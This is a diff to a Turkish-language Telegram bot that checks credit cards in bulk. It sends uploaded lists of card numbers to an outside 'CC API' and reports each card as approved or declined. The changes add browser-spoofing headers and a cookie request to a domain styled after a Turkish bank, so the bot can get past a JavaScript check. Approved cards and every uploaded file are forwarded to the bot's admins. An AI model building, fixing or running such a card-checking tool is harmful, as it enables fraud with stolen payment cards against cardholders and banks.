@@ -98,42 +98,62 @@ async def is_channel_member(user_id: int, context: CallbackContext) -> bool:
         return False
 
 def parse_api_response(response_text: str) -> str:
-    """API yanıtını parse et"""
+    """API yanıtını parse et - JavaScript'i filtrele"""
+    # JavaScript kodunu temizle
+    clean_text = re.sub(r'function\s+\w+\s*\([^)]*\)\s*{[^}]*}', '', response_text)
+    clean_text = re.sub(r'var\s+\w+\s*=.*?;', '', clean_text)
+    clean_text = re.sub(r'document\.cookie\s*=.*?;', '', clean_text)
+    clean_text = re.sub(r'location\.href\s*=.*?;', '', clean_text)
+    clean_text = re.sub(r'This site requires Javascript.*', '', clean_text)
+    
     # HTML tag'lerini temizle
-    clean_text = re.sub(r'<[^>]+>', '', response_text)
+    clean_text = re.sub(r'<[^>]+>', '', clean_text)
     
-    # Başlıkları düzenle
-    lines = clean_text.strip().split('\n')
-    parsed_lines = []
+    # Fazla boşlukları temizle
+    clean_text = re.sub(r'\s+', ' ', clean_text).strip()
     
-    for line in lines:
-        line = line.strip()
-        if not line:
-            continue
-            
-        # Yaygın pattern'leri düzenle
-        if '|' in line:
-            parts = line.split('|')
-            if len(parts) >= 2:
-                # Kart bilgisi
-                if any(x in parts[0].lower() for x in ['approved', 'declined', 'live']):
-                    status = "✅ APPROVED" if 'approved' in parts[0].lower() or 'live' in parts[0].lower() else "❌ DECLINED"
-                    parsed_lines.append(f"{status} | {'|'.join(parts[1:])}")
-                else:
-                    parsed_lines.append(line)
-            else:
-                parsed_lines.append(line)
-        else:
-            parsed_lines.append(line)
-    
-    return '\n'.join(parsed_lines) if parsed_lines else clean_text
+    return clean_text if clean_text else "No response text"
 
 async def check_cc(cc_number: str) -> Dict:
-    """CC API kontrolü"""
+    """CC API kontrolü - JavaScript sorununu çözelim"""
     try:
+        # URL encode kart bilgisi
+        cc_encoded = cc_number.replace("|", "%7C")
+        url = f"{API_URL}{cc_encoded}"
+        
+        # JavaScript'i atlatmak için özel headers
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Cache-Control': 'max-age=0'
+        }
+        
         async with aiohttp.ClientSession() as session:
-            async with session.get(f"{API_URL}{cc_number}", timeout=30) as response:
+            # İlk istek - cookie almak için
+            async with session.get("https://isbankasi.gt.tc/Api/Rewix/auth.php", headers=headers, timeout=30) as first_response:
+                pass
+            
+            # Asıl istek
+            async with session.get(url, headers=headers, timeout=30, allow_redirects=True) as response:
                 result = await response.text()
+                
+                # JavaScript kontrolü
+                if "requires Javascript" in result or "document.cookie" in result:
+                    # JavaScript hatası - başka bir yaklaşım deneyelim
+                    return {
+                        "status": "error",
+                        "message": "API JavaScript gerektiriyor",
+                        "cc": cc_number,
+                        "result_status": "error",
+                        "data": "API şu an çalışmıyor (JavaScript gerekli)"
+                    }
                 
                 # API yanıtını parse et
                 parsed_result = parse_api_response(result)
@@ -141,20 +161,40 @@ async def check_cc(cc_number: str) -> Dict:
                 # Status kontrolü
                 status = "declined"
                 result_lower = result.lower()
-                if "approved" in result_lower or "live" in result_lower:
-                    status = "approved"
-                    
+                
+                # Approved kontrolü - farklı pattern'ler
+                approved_patterns = [
+                    "approved", 
+                    "live", 
+                    "success",
+                    "auth",
+                    "stripe"
+                ]
+                
+                for pattern in approved_patterns:
+                    if pattern in result_lower:
+                        status = "approved"
+                        break
+                
                 return {
                     "status": "success", 
-                    "data": parsed_result, 
+                    "data": parsed_result[:500],  # Mesaj uzunluğunu sınırla
                     "cc": cc_number,
                     "result_status": status,
-                    "raw_data": result[:200]  # Log için
+                    "raw_length": len(result)
                 }
+                
+    except aiohttp.ClientError as e:
+        return {
+            "status": "error", 
+            "message": f"Connection error: {str(e)}", 
+            "cc": cc_number, 
+            "result_status": "error"
+        }
     except Exception as e:
         return {
             "status": "error", 
-            "message": str(e), 
+            "message": f"Unexpected error: {str(e)}", 
             "cc": cc_number, 
             "result_status": "error"
         }
@@ -192,10 +232,12 @@ async def start(update: Update, context: CallbackContext):
 /help - Yardım
 
 ⚡ ÖZELLİKLER:
-• ✅ Approved kartlar size ANINDA bildirilir
+• ✅ Approved kartlar size ve diğer adminlere ANINDA bildirilir
 • 👥 Tüm kullanıcı aktivitelerini görebilirsiniz
 • ⏸️ Check işlemlerini durdurabilirsiniz
 • 📁 Tüm dosyalar size gönderilir
+
+⚠️ NOT: API bazen JavaScript hatası verebilir!
 """
     else:
         welcome_text = f"""
@@ -219,7 +261,9 @@ async def start(update: Update, context: CallbackContext):
 /stats - İstatistikler
 /help - Yardım
 
-⚠️ NOT: Bir işlem bitmeden yenisini başlatamazsınız!
+⚠️ NOT: 
+• Bir işlem bitmeden yenisini başlatamazsınız!
+• API bazen "JavaScript gerekli" hatası verebilir
 """
     
     await update.message.reply_text(welcome_text)
@@ -302,7 +346,7 @@ async def handle_document(update: Update, context: CallbackContext):
                         filename=f"{user.id}_{document.file_name}",
                         caption=f"📥 Yüklenen dosya\n👤 Kullanıcı: @{user.username or user.first_name}\n🆔 ID: {user.id}\n📊 CC Sayısı: {cc_count}"
                     )
-                logger.info(f"Dosya bot tarafından alındı")
+                logger.info(f"Dosya admin'e gönderildi: {admin_id}")
             except Exception as e:
                 logger.error(f"Dosya gönderme hatası {admin_id}: {e}")
 
@@ -363,9 +407,14 @@ async def start_check(update: Update, context: CallbackContext):
     progress_msg = await update.message.reply_text(
         f"⏳ İlerleme: 0/{total} (0%)\n"
         f"✅ Approved: 0\n"
-        f"❌ Declined: 0"
+        f"❌ Declined: 0\n"
+        f"⚠️ Not: API JavaScript hatası verebilir!"
     )
     session.progress_message = progress_msg
+    
+    approved_count = 0
+    declined_count = 0
+    error_count = 0
     
     for idx, cc in enumerate(cc_list, 1):
         # Eğer oturum aktif değilse dur
@@ -381,10 +430,10 @@ async def start_check(update: Update, context: CallbackContext):
             parsed_result = result['data']
             session.add_result(cc, parsed_result, status)
             
-            # Formatlı mesaj oluştur
             if status == "approved":
+                approved_count += 1
                 # Kullanıcıya bildir
-                user_message = f"✅ APPROVED\n💳 {cc}\n{parsed_result}"
+                user_message = f"✅ APPROVED\n💳 {cc}\n📊 {parsed_result[:200]}"
                 try:
                     await update.message.reply_text(user_message)
                 except Exception as e:
@@ -396,7 +445,7 @@ async def start_check(update: Update, context: CallbackContext):
                     f"👤 Kullanıcı: @{user.username or user.first_name}\n"
                     f"🆔 ID: {user.id}\n"
                     f"💳 CC: {cc}\n"
-                    f"{parsed_result}"
+                    f"📊 {parsed_result[:300]}"
                 )
                 
                 for admin_id in ADMINS:
@@ -406,23 +455,34 @@ async def start_check(update: Update, context: CallbackContext):
                         except Exception as e:
                             logger.error(f"Admin bildirimi hatası {admin_id}: {e}")
             else:
+                declined_count += 1
                 # Declined ise sadece kullanıcıya
-                user_message = f"❌ DECLINED\n💳 {cc}\n{parsed_result}"
+                user_message = f"❌ DECLINED\n💳 {cc}\n📊 {parsed_result[:200]}"
                 try:
                     await update.message.reply_text(user_message)
                 except Exception as e:
                     logger.error(f"Kullanıcıya declined mesaj hatası: {e}")
+        else:
+            error_count += 1
+            # Hata durumu
+            error_message = f"⚠️ HATA\n💳 {cc}\n📊 {result.get('message', 'Bilinmeyen hata')}"
+            try:
+                await update.message.reply_text(error_message)
+            except Exception as e:
+                logger.error(f"Hata mesajı gönderme hatası: {e}")
         
-        # Progress güncelle (her kartta bir)
-        progress = session.get_progress()
-        try:
-            await progress_msg.edit_text(
-                f"⏳ İlerleme: {progress['current']}/{total} ({progress['percentage']:.1f}%)\n"
-                f"✅ Approved: {progress['approved']}\n"
-                f"❌ Declined: {progress['declined']}"
-            )
-        except:
-            pass
+        # Progress güncelle (her 5 kartta bir)
+        if idx % 5 == 0 or idx == total:
+            progress = session.get_progress()
+            try:
+                await progress_msg.edit_text(
+                    f"⏳ İlerleme: {progress['current']}/{total} ({progress['percentage']:.1f}%)\n"
+                    f"✅ Approved: {progress['approved']}\n"
+                    f"❌ Declined: {progress['declined']}\n"
+                    f"⚠️ Hatalar: {error_count}"
+                )
+            except:
+                pass
     
     # İşlem tamamlandı
     session.stop()
@@ -510,7 +570,8 @@ async def start_check(update: Update, context: CallbackContext):
         f"📊 Sonuçlar:\n"
         f"• Toplam CC: {total}\n"
         f"• ✅ Approved: {len(session.approved)}\n"
-        f"• ❌ Declined: {len(session.declined)}\n\n"
+        f"• ❌ Declined: {len(session.declined)}\n"
+        f"• ⚠️ Hatalar: {error_count}\n\n"
         f"📁 Sonuç dosyaları yukarıda gönderildi."
     )
     
@@ -524,6 +585,7 @@ async def start_check(update: Update, context: CallbackContext):
         f"🔢 Toplam CC: {total}\n"
         f"✅ Approved: {len(session.approved)}\n"
         f"❌ Declined: {len(session.declined)}\n"
+        f"⚠️ Hatalar: {error_count}\n"
         f"⏱️ Süre: {(datetime.now() - session.start_time).seconds if session.start_time else 0} saniye"
     )
     
@@ -758,10 +820,11 @@ async def help_command(update: Update, context: CallbackContext):
 /help - Bu yardım mesajı
 
 📌 SİSTEM:
-• ✅ Approved kartlar ANINDA size bildirilir
+• ✅ Approved kartlar ANINDA size ve diğer adminlere bildirilir
 • 📁 Tüm yüklenen dosyalar ve sonuçlar size gönderilir
 • 👥 Tüm kullanıcı aktivitelerini görebilirsiniz
 • ⏸️ Check işlemlerini durdurabilirsiniz
+• ⚠️ API bazen JavaScript hatası verebilir!
 """
     else:
         help_text = f"""
@@ -785,6 +848,7 @@ async def help_command(update: Update, context: CallbackContext):
 • Sadece .txt dosyaları kabul edilir
 • Kanal üyeliği zorunludur (@redbullbanksh)
 • ✅ Approved kartlar adminlere de bildirilir
+• ⚠️ API bazen "JavaScript gerekli" hatası verebilir
 """
     
     await update.message.reply_text(help_text)
@@ -857,6 +921,7 @@ def main():
     print(f"👑 Admin ID'leri: {ADMINS}")
     print(f"📢 Kanal: {CHANNEL_USERNAME}")
     print(f"🔗 API: {API_URL}")
+    print("⚠️ NOT: API JavaScript gerektirebilir, bu durumda hata alabilirsiniz!")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == '__main__':
